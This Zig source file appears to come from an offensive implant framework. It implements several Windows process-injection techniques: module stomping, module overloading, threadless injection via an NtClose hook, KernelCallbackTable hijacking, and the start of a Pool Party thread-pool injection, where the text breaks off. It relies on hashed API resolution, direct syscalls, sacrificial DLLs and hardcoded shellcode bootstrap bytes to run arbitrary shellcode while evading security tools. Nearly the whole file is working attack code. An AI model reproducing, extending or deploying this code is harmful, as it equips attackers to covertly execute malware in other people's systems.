const std = @import("std");
const api = @import("api.zig");
const obf = @import("obf.zig");
const alloc = @import("alloc.zig");
const win = @import("win32.zig");
const config = @import("config.zig");
const syscalls = @import("syscalls.zig");

const NX_IMAGE_DOS_SIGNATURE: u16 = 0x5A4D;
const NX_IMAGE_NT_SIGNATURE: u32 = 0x00004550;
const NX_IMAGE_SCN_MEM_EXECUTE: u32 = 0x20000000;

var nx_cfg_memory_hole = true;
var nx_cfg_sacrificial: []const u8 = "";
var nx_cfg_step_delay_ms: u32 = 0;

pub fn nx_configure(cfg: config.NxConfig) void {
    nx_cfg_memory_hole = !obf.eq(cfg.alloc_strategy, "standard");
    nx_cfg_sacrificial = cfg.sacrificial_process;
    nx_cfg_step_delay_ms = cfg.injection_step_delay_ms;
}

fn nx_step_delay() void {
    if (nx_cfg_step_delay_ms > 0) syscalls.nx_delay(nx_cfg_step_delay_ms);
}

fn nx_target_or_default(default: []const u8) []const u8 {
    if (nx_cfg_sacrificial.len > 0) return nx_cfg_sacrificial;
    return default;
}

pub fn nx_alloc_local(size: usize, protect: u32) ?*anyopaque {
    return nx_alloc_region(win.GetCurrentProcess(), size, protect);
}

pub fn nx_free_local(memory: ?*anyopaque) void {
    _ = syscalls.nx_free(win.GetCurrentProcess(), memory, 0, win.MEM_RELEASE);
}

fn nx_alloc_region(process: win.HANDLE, size: usize, protect: u32) ?*anyopaque {
    if (nx_cfg_memory_hole) {
        if (nx_alloc_memory_hole(process, size, protect)) |memory| return memory;
    }
    return syscalls.nx_alloc(
        process,
        null,
        size,
        win.MEM_COMMIT | win.MEM_RESERVE,
        protect,
    );
}

fn nx_alloc_memory_hole(process: win.HANDLE, size: usize, protect: u32) ?*anyopaque {
    const anchor = api.nx_api(0xD432B36D, 0xAB9B41E7) orelse return null;
    const anchor_address = @intFromPtr(anchor);
    const base = (anchor_address & 0xFFFFFFFFFFF70000) - 0x70000000;
    const upper = anchor_address + 0x70000000;
    var probe = base;
    while (probe < upper) : (probe += 0x10000) {
        if (syscalls.nx_alloc(
            process,
            @ptrFromInt(probe),
            size,
            win.MEM_COMMIT | win.MEM_RESERVE,
            protect,
        )) |memory| return memory;
    }
    return null;
}

fn nx_remote_write(process: win.HANDLE, address: ?*anyopaque, buffer: []const u8) bool {
    return syscalls.nx_write(process, address, @ptrCast(buffer.ptr), buffer.len);
}

fn nx_remote_read(process: win.HANDLE, address: ?*anyopaque, buffer: []u8) bool {
    return syscalls.nx_read(process, address, @ptrCast(buffer.ptr), buffer.len);
}
const NX_STATUS_IMAGE_NOT_AT_BASE: i32 = 0x40000003;
const NX_SECTION_INHERIT_VIEW_UNMAP: u32 = 2;
const INVALID_FILE_ATTRIBUTES = win.INVALID_FILE_ATTRIBUTES;
const INVALID_HANDLE_VALUE = win.INVALID_HANDLE_VALUE;

const NxSectionInfo = struct {
    rva: u32,
    size: usize,
};

fn nx_read_u16(data: []const u8, offset: usize) ?u16 {
    if (offset + 2 > data.len) return null;
    return std.mem.readInt(u16, data[offset..][0..2], .little);
}

fn nx_read_u32(data: []const u8, offset: usize) ?u32 {
    if (offset + 4 > data.len) return null;
    return std.mem.readInt(u32, data[offset..][0..4], .little);
}

fn nx_section_info(data: []const u8) ?NxSectionInfo {
    if (nx_read_u16(data, 0) != NX_IMAGE_DOS_SIGNATURE) return null;
    const lfanew = nx_read_u32(data, 0x3C) orelse return null;
    const nt = @as(usize, lfanew);
    if (nx_read_u32(data, nt) != NX_IMAGE_NT_SIGNATURE) return null;

    const section_count = nx_read_u16(data, nt + 6) orelse return null;
    const optional_size = nx_read_u16(data, nt + 20) orelse return null;
    const sections = nt + 24 + @as(usize, optional_size);
    if (sections > data.len) return null;

    var fallback: ?NxSectionInfo = null;
    var index: usize = 0;
    while (index < section_count) : (index += 1) {
        const header = sections + index * 40;
        if (header + 40 > data.len) return null;
        const name = data[header .. header + 8];
        const virtual_size = nx_read_u32(data, header + 8) orelse return null;
        const virtual_address = nx_read_u32(data, header + 12) orelse return null;
        const raw_size = nx_read_u32(data, header + 16) orelse return null;
        const characteristics = nx_read_u32(data, header + 36) orelse return null;
        const size = if (virtual_size != 0) @as(usize, virtual_size) else @as(usize, raw_size);
        const info = NxSectionInfo{ .rva = virtual_address, .size = size };
        if (std.mem.startsWith(u8, name, ".text")) return info;
        if (fallback == null and (characteristics & NX_IMAGE_SCN_MEM_EXECUTE) != 0)
            fallback = info;
    }
    return fallback;
}

fn nx_file_section_info(allocator: std.mem.Allocator, path: []const u8) ?NxSectionInfo {
    const wide = std.unicode.utf8ToUtf16LeAllocZ(allocator, path) catch return null;
    defer allocator.free(wide);
    if (win.GetFileAttributesW(wide.ptr) == INVALID_FILE_ATTRIBUTES) return null;

    const file = win.CreateFileW(
        wide.ptr,
        win.GENERIC_READ,
        win.FILE_SHARE_READ,
        null,
        win.OPEN_EXISTING,
        win.FILE_ATTRIBUTE_NORMAL,
        null,
    );
    if (file == INVALID_HANDLE_VALUE) return null;
    defer _ = win.CloseHandle(file);

    var buffer: [0x1000]u8 = undefined;
    var read: win.DWORD = 0;
    if (!win.ReadFile(file, &buffer, buffer.len, &read, null).toBool()) return null;
    return nx_section_info(buffer[0..read]);
}

fn nx_module_section_info(module: win.HMODULE) ?NxSectionInfo {
    const base: [*]const u8 = @ptrFromInt(@intFromPtr(module));
    return nx_section_info(base[0..0x1000]);
}

fn nx_load_library(path: []const u8, allocator: std.mem.Allocator) ?win.HMODULE {
    const wide = std.unicode.utf8ToUtf16LeAllocZ(allocator, path) catch return null;
    defer allocator.free(wide);
    // LoadLibraryW avoids ANSI path conversion issues for system DLLs.
    return win.LoadLibraryW(wide.ptr);
}

const nx_sacrificial = [_][]const u8{
    "C:\\Windows\\System32\\xpssupport.dll",
    "C:\\Windows\\System32\\amsi.dll",
    "C:\\Windows\\System32\\dbghelp.dll",
    "C:\\Windows\\System32\\version.dll",
    "C:\\Windows\\System32\\winhttp.dll",
    "C:\\Windows\\System32\\cryptsp.dll",
};

fn nx_start_thread_at(address: [*]u8) ?win.HANDLE {
    const start: win.THREAD_START_ROUTINE = @ptrCast(@alignCast(address));
    return win.CreateThread(null, 0, start, null, 0, null);
}

pub fn nx_module_stomp(
    allocator: std.mem.Allocator,
    shellcode: []const u8,
    forced_dll: []const u8,
) ![]u8 {
    if (shellcode.len == 0) return allocator.dupe(u8, "Empty shellcode");

    if (forced_dll.len != 0) {
        const module = nx_load_library(forced_dll, allocator) orelse
            return allocator.dupe(u8, "Failed to load the sacrificial DLL");
        const info = nx_module_section_info(module) orelse {
            _ = win.FreeLibrary(module);
            return allocator.dupe(u8, "Sacrificial DLL has no executable section");
        };
        if (info.size < shellcode.len) {
            _ = win.FreeLibrary(module);
            return allocator.dupe(u8, "Sacrificial DLL .text is too small");
        }
        return nx_stomp_module(allocator, module, info, shellcode);
    }

    for (nx_sacrificial) |path| {
        const module = nx_load_library(path, allocator) orelse continue;
        const info = nx_module_section_info(module) orelse {
            _ = win.FreeLibrary(module);
            continue;
        };
        if (info.size < shellcode.len) {
            _ = win.FreeLibrary(module);
            continue;
        }
        return nx_stomp_module(allocator, module, info, shellcode);
    }
    return allocator.dupe(u8, "Failed to load a suitable sacrificial DLL");
}

fn nx_stomp_module(
    allocator: std.mem.Allocator,
    module: win.HMODULE,
    info: NxSectionInfo,
    shellcode: []const u8,
) ![]u8 {
    const base: [*]u8 = @ptrFromInt(@intFromPtr(module));
    const text = base + info.rva;
    var old_protect: win.DWORD = 0;
    if (!win.VirtualProtect(text, info.size, win.PAGE_READWRITE, &old_protect).toBool())
        return allocator.dupe(u8, "Failed to unprotect the sacrificial .text");

    @memcpy(text[0..shellcode.len], shellcode);

    if (!win.VirtualProtect(text, info.size, win.PAGE_EXECUTE_READ, &old_protect).toBool())
        return allocator.dupe(u8, "Failed to restore .text protection");

    const thread = nx_start_thread_at(text) orelse
        return allocator.dupe(u8, "Stomped the module but failed to start the shellcode");
    _ = win.CloseHandle(thread);
    return allocator.dupe(u8, "Module stomping injection completed");
}

fn nx_resolve_ntdll(function_hash: u32) ?*anyopaque {
    return api.nx_api(0xD432B36D, function_hash);
}

const NxNtCreateSectionFn = *const fn (
    *win.HANDLE,
    u32,
    ?*anyopaque,
    ?*i64,
    u32,
    u32,
    ?win.HANDLE,
) callconv(.winapi) i32;

const NxNtMapViewOfSectionFn = *const fn (
    win.HANDLE,
    win.HANDLE,
    *?*anyopaque,
    usize,
    usize,
    ?*i64,
    *usize,
    u32,
    u32,
    u32,
) callconv(.winapi) i32;

const NxNtUnmapViewOfSectionFn = *const fn (
    win.HANDLE,
    ?*anyopaque,
) callconv(.winapi) i32;

const NxNtProtectVirtualMemoryFn = *const fn (
    win.HANDLE,
    *?*anyopaque,
    *usize,
    u32,
    *u32,
) callconv(.winapi) i32;

fn nx_nt_function(comptime T: type, function_hash: u32) ?T {
    const pointer = nx_resolve_ntdll(function_hash) orelse return null;
    return @ptrCast(@alignCast(pointer));
}

fn nx_map_overload_image(
    allocator: std.mem.Allocator,
    process: win.HANDLE,
    path: []const u8,
    shellcode: []const u8,
) !?[]u8 {
    const info = nx_file_section_info(allocator, path) orelse return null;
    if (info.size < shellcode.len) return null;

    const wide = std.unicode.utf8ToUtf16LeAllocZ(allocator, path) catch return null;
    defer allocator.free(wide);
    if (win.GetFileAttributesW(wide.ptr) == INVALID_FILE_ATTRIBUTES) return null;

    const file = win.CreateFileW(
        wide.ptr,
        win.GENERIC_READ,
        win.FILE_SHARE_READ,
        null,
        win.OPEN_EXISTING,
        win.FILE_ATTRIBUTE_NORMAL,
        null,
    );
    if (file == INVALID_HANDLE_VALUE) return null;
    defer _ = win.CloseHandle(file);

    const create_section = nx_nt_function(NxNtCreateSectionFn, 0x8EF7809A) orelse return null;
    const map_view = nx_nt_function(NxNtMapViewOfSectionFn, 0x273314D4) orelse return null;
    const protect = nx_nt_function(NxNtProtectVirtualMemoryFn, 0xE7011692) orelse return null;
    const unmap = nx_nt_function(NxNtUnmapViewOfSectionFn, 0x28F4F657) orelse return null;

    var section: win.HANDLE = undefined;
    var status = create_section(
        &section,
        win.SECTION_ALL_ACCESS,
        null,
        null,
        win.PAGE_READONLY,
        win.SEC_IMAGE,
        file,
    );
    if (status != 0) return null;
    defer _ = win.CloseHandle(section);

    var base: ?*anyopaque = null;
    var view_size: usize = 0;
    status = map_view(
        section,
        process,
        &base,
        0,
        0,
        null,
        &view_size,
        NX_SECTION_INHERIT_VIEW_UNMAP,
        0,
        win.PAGE_READONLY,
    );
    if (status != 0 and status != NX_STATUS_IMAGE_NOT_AT_BASE) return null;
    const mapped = base orelse return null;
    errdefer {
        _ = unmap(process, mapped);
    }

    const base_bytes: [*]u8 = @ptrCast(mapped);
    const text = base_bytes + info.rva;
    var protect_base: ?*anyopaque = @ptrCast(text);
    var protect_size: usize = info.size;
    var old_protect: u32 = 0;
    status = protect(
        process,
        &protect_base,
        &protect_size,
        win.PAGE_READWRITE,
        &old_protect,
    );
    if (status != 0) return error.ProtectFailed;

    if (process == win.GetCurrentProcess()) {
        @memcpy(text[0..shellcode.len], shellcode);
    } else {
        if (!win.WriteProcessMemory(
            process,
            @ptrCast(text),
            @ptrCast(shellcode.ptr),
            shellcode.len,
            null,
        ).toBool()) return error.WriteFailed;
    }

    protect_base = @ptrCast(text);
    protect_size = info.size;
    status = protect(
        process,
        &protect_base,
        &protect_size,
        win.PAGE_EXECUTE_READ,
        &old_protect,
    );
    if (status != 0) return error.ProtectFailed;

    const thread = if (process == win.GetCurrentProcess())
        nx_start_thread_at(text)
    else
        win.CreateRemoteThread(
            process,
            null,
            0,
            @ptrCast(@alignCast(text)),
            null,
            0,
            null,
        );
    const handle = thread orelse return error.ThreadFailed;
    _ = win.CloseHandle(handle);
    nx_step_delay();

    return try std.fmt.allocPrint(
        allocator,
        "Module overloading injection completed ({s}, base=0x{x})",
        .{ path, @intFromPtr(mapped) },
    );
}

pub fn nx_module_overload(
    allocator: std.mem.Allocator,
    shellcode: []const u8,
    pid: u32,
    forced_dll: []const u8,
) ![]u8 {
    if (shellcode.len == 0) return allocator.dupe(u8, "Empty shellcode");

    const current = win.GetCurrentProcess();
    const process = if (pid == 0)
        current
    else
        win.OpenProcess(win.PROCESS_ALL_ACCESS, win.BOOL.FALSE, pid) orelse
            return allocator.dupe(u8, "Failed to open target process");
    defer {
        if (pid != 0) _ = win.CloseHandle(process);
    }

    if (forced_dll.len != 0) {
        if (try nx_map_overload_image(allocator, process, forced_dll, shellcode)) |message| return message;
        return allocator.dupe(u8, "Failed to map the requested DLL image");
    }

    for (nx_sacrificial) |path| {
        if (try nx_map_overload_image(allocator, process, path, shellcode)) |message| return message;
    }
    return allocator.dupe(u8, "Failed to map a candidate DLL image");
}

const nx_threadless_bootstrap = [_]u8{
    0x58, 0x48, 0x83, 0xE8, 0x0C, 0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41,
    0x53, 0x48, 0xB9, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0x48, 0x89, 0x08, 0x48,
    0xB9, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0x48, 0x89, 0x48, 0x08, 0x48, 0x83,
    0xEC, 0x40, 0xE8, 0x11, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5B, 0x41, 0x5A,
    0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0x58, 0xFF, 0xE0,
};

fn nx_spawn_injection_target(allocator: std.mem.Allocator) ?win.PROCESS_INFORMATION {
    const candidates = [_][]const u8{
        "C:\\Windows\\System32\\ProximityUxHost.exe",
        "C:\\Windows\\System32\\RuntimeBroker.exe",
        "C:\\Windows\\System32\\charmap.exe",
    };
    if (nx_cfg_sacrificial.len > 0) {
        return nx_spawn_path(allocator, nx_cfg_sacrificial);
    }
    for (candidates) |path| {
        if (nx_spawn_path(allocator, path)) |process| return process;
    }
    return null;
}

fn nx_spawn_path(allocator: std.mem.Allocator, path: []const u8) ?win.PROCESS_INFORMATION {
    const command = allocator.printSentinel("{s}", .{path}, 0) catch return null;
    defer allocator.free(command);
    var startup: win.STARTUPINFOA = std.mem.zeroes(win.STARTUPINFOA);
    startup.cb = @sizeOf(win.STARTUPINFOA);
    var process_info: win.PROCESS_INFORMATION = std.mem.zeroes(win.PROCESS_INFORMATION);
    if (!win.CreateProcessA(
        null,
        command.ptr,
        null,
        null,
        win.BOOL.FALSE,
        win.CREATE_NO_WINDOW,
        null,
        null,
        &startup,
        &process_info,
    ).toBool()) return null;
    return process_info;
}

pub fn nx_threadless(
    allocator: std.mem.Allocator,
    shellcode: []const u8,
    pid: u32,
) ![]u8 {
    if (shellcode.len == 0) return allocator.dupe(u8, "Empty shellcode");

    const ntclose_ptr = api.nx_api(0xD432B36D, 0xAB9B41E7) orelse
        return allocator.dupe(u8, "Failed to find NtClose");
    const ntclose: [*]u8 = @ptrCast(ntclose_ptr);

    var original: [16]u8 = undefined;
    @memcpy(original[0..], ntclose[0..16]);

    var payload: std.ArrayList(u8) = .empty;
    defer payload.deinit(allocator);
    try payload.appendSlice(allocator, &nx_threadless_bootstrap);
    @memcpy(payload.items[0x12..0x1A], original[0..8]);
    @memcpy(payload.items[0x1F..0x27], original[8..16]);
    try payload.appendSlice(allocator, shellcode);

    var process: win.HANDLE = undefined;
    var process_owned = false;
    var spawned: ?win.PROCESS_INFORMATION = null;
    if (pid != 0) {
        process = win.OpenProcess(0x438, win.BOOL.FALSE, pid) orelse
            return allocator.dupe(u8, "Failed to open target process");
        process_owned = true;
    } else {
        spawned = nx_spawn_injection_target(allocator) orelse
            return allocator.dupe(u8, "Failed to spawn target process");
        process = spawned.?.hProcess;
        process_owned = true;
        _ = win.CloseHandle(spawned.?.hThread);
    }
    defer {
        if (process_owned) _ = win.CloseHandle(process);
    }
    nx_step_delay();

    const remote = nx_alloc_region(process, payload.items.len, win.PAGE_READWRITE) orelse
        return allocator.dupe(u8, "Failed to allocate remote memory");
    nx_step_delay();
    if (!nx_remote_write(process, remote, payload.items))
        return allocator.dupe(u8, "Failed to write remote payload");
    nx_step_delay();

    var old_protect: win.DWORD = 0;
    if (!syscalls.nx_protect(process, remote, payload.items.len, win.PAGE_EXECUTE_READ, &old_protect))
        return allocator.dupe(u8, "Failed to protect remote payload");
    nx_step_delay();

    var trampoline = [_]u8{
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0xFF, 0xD0, 0x90, 0x90, 0x90, 0x90,
    };
    std.mem.writeInt(u64, trampoline[2..10], @intFromPtr(remote), .little);

    if (!win.VirtualProtectEx(
        process,
        @ptrCast(ntclose),
        trampoline.len,
        win.PAGE_EXECUTE_READWRITE,
        &old_protect,
    ).toBool()) return allocator.dupe(u8, "Failed to unprotect NtClose");

    if (!win.WriteProcessMemory(
        process,
        @ptrCast(ntclose),
        &trampoline,
        trampoline.len,
        null,
    ).toBool()) return allocator.dupe(u8, "Failed to write NtClose trampoline");

    // Keep the NtClose page writable until the hook fires: the bootstrap's
    // first job is to restore the original 16 bytes before jumping into the
    // shellcode.  Restoring RX here makes that self-restore write fault.
    var payload_check: [16]u8 = undefined;
    var payload_read: usize = 0;
    if (!win.ReadProcessMemory(
        process,
        remote,
        &payload_check,
        payload_check.len,
        &payload_read,
    ).toBool() or payload_read != payload_check.len)
        return allocator.dupe(u8, "Failed to verify remote payload");

    var attempt: usize = 0;
    while (attempt < 30) : (attempt += 1) {
        win.Sleep(1000);
        var current: [16]u8 = undefined;
        var read: usize = 0;
        if (win.ReadProcessMemory(
            process,
            @ptrCast(ntclose),
            &current,
            current.len,
            &read,
        ).toBool() and read == current.len and std.mem.eql(u8, &current, &original)) {
            _ = win.VirtualProtectEx(
                process,
                @ptrCast(ntclose),
                trampoline.len,
                win.PAGE_EXECUTE_READ,
                &old_protect,
            );
            return allocator.dupe(u8, "Threadless injection completed (hook restored)");
        }
    }

    return allocator.dupe(u8, "Threadless injection completed (hook may still trigger)");
}

const NxNtQueryInformationProcessFn = *const fn (
    win.HANDLE,
    u32,
    ?*anyopaque,
    u32,
    ?*u32,
) callconv(.winapi) i32;

const NxProcessBasicInformation = extern struct {
    ExitStatus: i32,
    PebBaseAddress: ?*anyopaque,
    AffinityMask: usize,
    BasePriority: i32,
    UniqueProcessId: usize,
    InheritedFromUniqueProcessId: usize,
};

var nx_kct_target_pid: win.DWORD = 0;
var nx_kct_windows: [64]?*anyopaque = @splat(null);
var nx_kct_window_count: usize = 0;

fn nx_kct_enum_window(hwnd: ?*anyopaque, _: isize) callconv(.winapi) win.BOOL {
    var pid: win.DWORD = 0;
    _ = win.GetWindowThreadProcessId(hwnd, &pid);
    if (pid == nx_kct_target_pid and nx_kct_window_count < nx_kct_windows.len) {
        nx_kct_windows[nx_kct_window_count] = hwnd;
        nx_kct_window_count += 1;
    }
    return win.BOOL.TRUE;
}

pub fn nx_kct(
    allocator: std.mem.Allocator,
    shellcode: []const u8,
    pid: u32,
) ![]u8 {
    if (shellcode.len == 0) return allocator.dupe(u8, "Empty shellcode");

    var process: win.HANDLE = undefined;
    var thread: ?win.HANDLE = null;
    var spawned = false;
    if (pid != 0) {
        process = win.OpenProcess(0x438, win.BOOL.FALSE, pid) orelse
            return allocator.dupe(u8, "Failed to open target process");
        nx_kct_target_pid = pid;
    } else {
        const command = allocator.printSentinel(
            "C:\\Windows\\System32\\charmap.exe",
            .{},
            0,
        ) catch return allocator.dupe(u8, "Failed to allocate command line");
        defer allocator.free(command);
        var startup: win.STARTUPINFOA = std.mem.zeroes(win.STARTUPINFOA);
        startup.cb = @sizeOf(win.STARTUPINFOA);
        var info: win.PROCESS_INFORMATION = std.mem.zeroes(win.PROCESS_INFORMATION);
        if (!win.CreateProcessA(
            null,
            command.ptr,
            null,
            null,
            win.BOOL.FALSE,
            win.CREATE_NO_WINDOW,
            null,
            null,
            &startup,
            &info,
        ).toBool()) return allocator.dupe(u8, "Failed to spawn charmap.exe");
        process = info.hProcess;
        thread = info.hThread;
        nx_kct_target_pid = info.dwProcessId;
        spawned = true;
    }
    defer {
        _ = win.CloseHandle(process);
        if (thread) |handle| _ = win.CloseHandle(handle);
    }

    _ = win.WaitForInputIdle(process, 2000);
    var window_attempt: usize = 0;
    while (window_attempt < 5) : (window_attempt += 1) {
        nx_kct_windows = @splat(null);
        nx_kct_window_count = 0;
        _ = win.EnumWindows(nx_kct_enum_window, 0);
        if (nx_kct_window_count != 0) break;
        win.Sleep(1000);
    }
    if (nx_kct_window_count == 0)
        return allocator.dupe(u8, "KCT hijack failed: target has no windows");

    const query_process = nx_nt_function(NxNtQueryInformationProcessFn, 0x821B078C) orelse
        return allocator.dupe(u8, "Failed to resolve NtQueryInformationProcess");
    var basic: NxProcessBasicInformation = std.mem.zeroes(NxProcessBasicInformation);
    var returned: u32 = 0;
    const status = query_process(
        process,
        0,
        &basic,
        @sizeOf(NxProcessBasicInformation),
        &returned,
    );
    if (status != 0 or basic.PebBaseAddress == null)
        return allocator.dupe(u8, "Failed to query target PEB");

    // PEB->KernelCallbackTable is at 0x58 on x64.
    const peb: [*]u8 = @ptrCast(basic.PebBaseAddress.?);
    var kct_address: ?*anyopaque = null;
    if (!win.ReadProcessMemory(
        process,
        @ptrCast(peb + 0x58),
        @ptrCast(&kct_address),
        @sizeOf(?*anyopaque),
        null,
    ).toBool()) return allocator.dupe(u8, "Failed to read KernelCallbackTable");
    const kct_ptr = kct_address orelse
        return allocator.dupe(u8, "Target has no KernelCallbackTable");

    const remote = nx_alloc_region(process, shellcode.len, win.PAGE_READWRITE) orelse
        return allocator.dupe(u8, "Failed to allocate remote shellcode");
    nx_step_delay();
    if (!nx_remote_write(process, remote, shellcode))
        return allocator.dupe(u8, "Failed to write remote shellcode");
    var old_protect: win.DWORD = 0;
    if (!syscalls.nx_protect(process, remote, shellcode.len, win.PAGE_EXECUTE_READ, &old_protect))
        return allocator.dupe(u8, "Failed to protect remote shellcode");
    nx_step_delay();

    var original_callback: usize = 0;
    if (!nx_remote_read(process, kct_ptr, std.mem.asBytes(&original_callback)))
        return allocator.dupe(u8, "Failed to read __fnCOPYDATA");

    var callback_address = @intFromPtr(remote);
    if (!syscalls.nx_protect(process, kct_ptr, @sizeOf(usize), win.PAGE_READWRITE, &old_protect))
        return allocator.dupe(u8, "Failed to unprotect __fnCOPYDATA");
    if (!syscalls.nx_write(process, kct_ptr, &callback_address, @sizeOf(usize)))
        return allocator.dupe(u8, "Failed to overwrite __fnCOPYDATA");
    _ = syscalls.nx_protect(process, kct_ptr, @sizeOf(usize), old_protect, &old_protect);
    nx_step_delay();

    var data = [_]u8{ 'n', 'o', 'm', 'a', 'd', 'x', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
    var copy_data = win.COPYDATASTRUCT{
        .dwData = 1,
        .cbData = data.len,
        .lpData = &data,
    };
    for (nx_kct_windows[0..nx_kct_window_count]) |window| {
        _ = win.SendMessageW(window, 0x004A, 0, @intCast(@intFromPtr(&copy_data)));
    }

    _ = syscalls.nx_write(process, kct_ptr, &original_callback, @sizeOf(usize));
    _ = syscalls.nx_protect(process, kct_ptr, @sizeOf(usize), win.PAGE_READONLY, &old_protect);

    return allocator.dupe(u8, "KCT injection completed");
}

// Pool Party uses the Windows thread-pool timer queue.  The layout offsets below
// are for x64 Windows 10/11 (FULL_TP_TIMER is 0x168 bytes).
const NX_TP_TIMER_SIZE: usize = 360;
const NX_TP_TIMER_POOL: usize = 144;
const NX_TP_TIMER_WINDOW_END: usize = 248;
const NX_TP_TIMER_WINDOW_START: usize = 288;
const NX_TP_TIMER_DUE_TIME: usize = 328;
const NX_TP_POOL_TIMER_QUEUE: usize = 112;
const NX_TP_POOL_ABS_START_ROOT: usize = 128;
const NX_TP_POOL_ABS_END_ROOT: usize = 136;
const NX_WORKER_FACTORY_START_PARAMETER: usize = 80;
const NX_HANDLE_ENTRY_SIZE: usize = 40;
const NX_HANDLE_SNAPSHOT_HEADER: usize = 16;
const NX_STATUS_INFO_LENGTH_MISMATCH: i32 = 0xC0000004;

const NxNtQueryObjectFn = *const fn (
    win.HANDLE,
    u32,
    ?*anyopaque,
    u32,
    ?*u32,
) callconv(.winapi) i32;

const NxNtQueryInformationWorkerFactoryFn = *const fn (
    win.HANDLE,
    u32,
    ?*anyopaque,
    u32,
    ?*u32,
) callconv(.winapi) i32;

const NxNtSetTimer2Fn = *const fn (
    win.HANDLE,
    ?*i64,
    ?*i64,
    ?*anyopaque,
) callconv(.winapi) i32;

fn nx_handle_type_is(handle: win.HANDLE, expected: []const u16) bool {
    const query_object = nx_nt_function(NxNtQueryObjectFn, 0x6A0FF47E) orelse return false;
    var buffer: [0x1000]u8 = undefined;
    var needed: u32 = 0;
    const status = query_object(handle, 2, &buffer, buffer.len, &needed);
    if (status != 0) return false;
    if (std.mem.readInt(u16, buffer[0..2], .little) / 2 != expected.len) return false;
    const name_pointer = std.mem.readInt(usize, buffer[8..16], .little);
    if (name_pointer == 0) return false;
    const name: [*]const u16 = @ptrFromInt(name_pointer);
    return std.mem.eql(u16, name[0..expected.len], expected);
}

fn nx_find_process_handle(
    allocator: std.mem.Allocator,
    process: win.HANDLE,
    access: u32,
    expected: []const u16,
) ?win.HANDLE {
    const query_process = nx_nt_function(NxNtQueryInformationProcessFn, 0x821B078C) orelse
        return null;
    const size: usize = 1 << 20;
    const snapshot = allocator.alloc(u8, size) catch return null;
    defer allocator.free(snapshot);
    var needed: u32 = 0;
    const status = query_process(process, 51, snapshot.ptr, @intCast(size), &needed);
    if (status != 0) return null;

    const count = std.mem.readInt(usize, snapshot[0..8], .little);
    var index: usize = 0;
    while (index < count) : (index += 1) {
        const entry = NX_HANDLE_SNAPSHOT_HEADER + index * NX_HANDLE_ENTRY_SIZE;
        if (entry + NX_HANDLE_ENTRY_SIZE > snapshot.len) break;
        const source_handle: win.HANDLE = @ptrFromInt(std.mem.readInt(usize, snapshot[entry..][0..8], .little));
        var duplicate: win.HANDLE = undefined;
        if (!win.DuplicateHandle(
            process,
            source_handle,
            win.GetCurrentProcess(),
            &duplicate,
            access,
            win.BOOL.FALSE,
            0,
        ).toBool()) continue;
        if (nx_handle_type_is(duplicate, expected)) return duplicate;
        _ = win.CloseHandle(duplicate);
    }
    return null;
}

fn nx_query_worker_factory(handle: win.HANDLE) ?usize {
    const query_worker = nx_nt_function(NxNtQueryInformationWorkerFactoryFn, 0x6B9B8E7F) orelse
        return null;
    var buffer: [120]u8 = undefined;
    var needed: u32 = 0;
    const status = query_worker(handle, 7, &buffer, buffer.len, &needed);
    if (status != 0) return null;
    return std.mem.readInt(usize, buffer[NX_WORKER_FACTORY_START_PARAMETER..][0..8], .little);
}

fn nx_spawn_pool_target(allocator: std.mem.Allocator) ?win.PROCESS_INFORMATION {
    const path = nx_target_or_default("C:\\Windows\\System32\\CompPkgSrv.exe");
    const command = allocator.printSentinel("{s}", .{path}, 0) catch return null;
    defer allocator.free(command);
    var startup: win.STARTUPINFOA = std.mem.zeroes(win.STARTUPINFOA);
    startup.cb = @sizeOf(win.STARTUPINFOA);
    var info: win.PROCESS_INFORMATION = std.mem.zeroes(win.PROCESS_INFORMATION);
    if (!win.CreateProcessA(
        null,
        command.ptr,
        null,
        null,
        win.BOOL.FALSE,
        win.CREATE_NO_WINDOW,
        null,
        null,
        &startup,
        &info,
    ).toBool()) return null;
    return info;
}

pub fn nx_pool_party(
    allocator: std.mem.Allocator,
    shellcode: []const u8,
    pid: u32,
) ![]u8 {
    if (shellcode.len == 0) return allocator.dupe(u8, "Empty shellcode");

    var process: win.HANDLE = undefined;
    var thread_handle: ?win.HANDLE = null;
    var process_owned = false;
    if (pid != 0) {
        process = win.OpenProcess(0x438, win.BOOL.FALSE, pid) orelse
            return allocator.dupe(u8, "Failed to open target process");
        process_owned = true;
    } else {
        const spawned = nx_spawn_pool_target(allocator) orelse
            return allocator.dupe(u8, "Failed to spawn target process");
        process = spawned.hProcess;
        thread_handle = spawned.hThread;
        process_owned = true;
    }
    defer {
        if (process_owned) _ = win.CloseHandle(process);
        if (thread_handle) |handle| _ = win.CloseHandle(handle);
    }
    nx_step_delay();

    const remote_shellcode = nx_alloc_region(process, shellcode.len, win.PAGE_READWRITE) orelse
        return allocator.dupe(u8, "Failed to allocate remote shellcode");
    nx_step_delay();
    if (!nx_remote_write(process, remote_shellcode, shellcode))
        return allocator.dupe(u8, "Failed to write remote shellcode");
    var old_protect: win.DWORD = 0;
    if (!syscalls.nx_protect(
        process,
        remote_shellcode,
        shellcode.len,
        win.PAGE_EXECUTE_READ,
        &old_protect,
    )) return allocator.dupe(u8, "Failed to protect remote shellcode");
    nx_step_delay();

    const worker_name = std.unicode.utf8ToUtf16LeStringLiteral("TpWorkerFactory");
    const timer_name = std.unicode.utf8ToUtf16LeStringLiteral("IRTimer");

    var worker_handle: ?win.HANDLE = null;
    var timer_handle: ?win.HANDLE = null;
    var attempt: usize = 0;
    while (attempt < 5) : (attempt += 1) {
        if (worker_handle == null)
            worker_handle = nx_find_process_handle(allocator, process, 0x000F003F, worker_name);
        if (timer_handle == null)
            timer_handle = nx_find_process_handle(allocator, process, 0x001F0003, timer_name);
        if (worker_handle != null and timer_handle != null) break;
        win.Sleep(2000);
    }
    defer {
        if (worker_handle) |handle| _ = win.CloseHandle(handle);
        if (timer_handle) |handle| _ = win.CloseHandle(handle);
    }
    const worker = worker_handle orelse
        return allocator.dupe(u8, "Pool Party: worker factory not found");
    const timer = timer_handle orelse
        return allocator.dupe(u8, "Pool Party: IRTimer not found");

    const pool = nx_query_worker_factory(worker) orelse
        return allocator.dupe(u8, "Pool Party: worker factory query failed");
